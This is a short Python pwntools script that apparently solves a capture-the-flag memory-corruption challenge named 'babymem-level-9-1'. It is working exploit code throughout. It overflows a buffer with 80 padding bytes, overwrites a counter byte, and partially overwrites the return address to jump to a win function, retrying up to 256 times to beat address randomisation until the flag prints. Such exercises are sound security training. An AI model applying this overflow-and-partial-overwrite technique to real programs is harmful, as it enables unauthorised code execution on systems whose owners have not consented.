from pwn import *


for i in range(256):
    print(f'try {i}')
    proc = process('/challenge/babymem-level-9-1')
    proc.recvuntil(b'size: ')
    size = 106
    proc.sendline(str(size).encode())
    proc.recvuntil(b'!\n')

    offset_win_authed = p16(0x22c5)
    offset_n = 80
    payload = b'A' * (offset_n) + p8(103) + offset_win_authed
    proc.sendline(payload)
    try:
        r = proc.recvuntil(b'}')
        proc.close()
        print(r)
        break
    except EOFError:
        pass
